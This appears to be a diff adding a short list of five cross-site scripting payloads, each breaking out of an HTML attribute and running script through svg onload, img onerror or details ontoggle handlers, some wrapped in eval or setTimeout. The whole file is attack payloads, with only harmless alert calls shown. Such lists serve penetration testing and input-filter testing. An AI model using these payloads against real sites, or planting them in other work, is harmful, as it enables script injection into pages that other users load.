@@ -1,0 +1,5 @@
+"><svg/onload=alert(1)>
+"><svg/onload=setTimeout('alert(1)',1)>
+"><svg/onload=eval('alert(1)')>
+"><img src=x onerror=eval('alert(1)')>
+"><details open ontoggle=alert(1)>
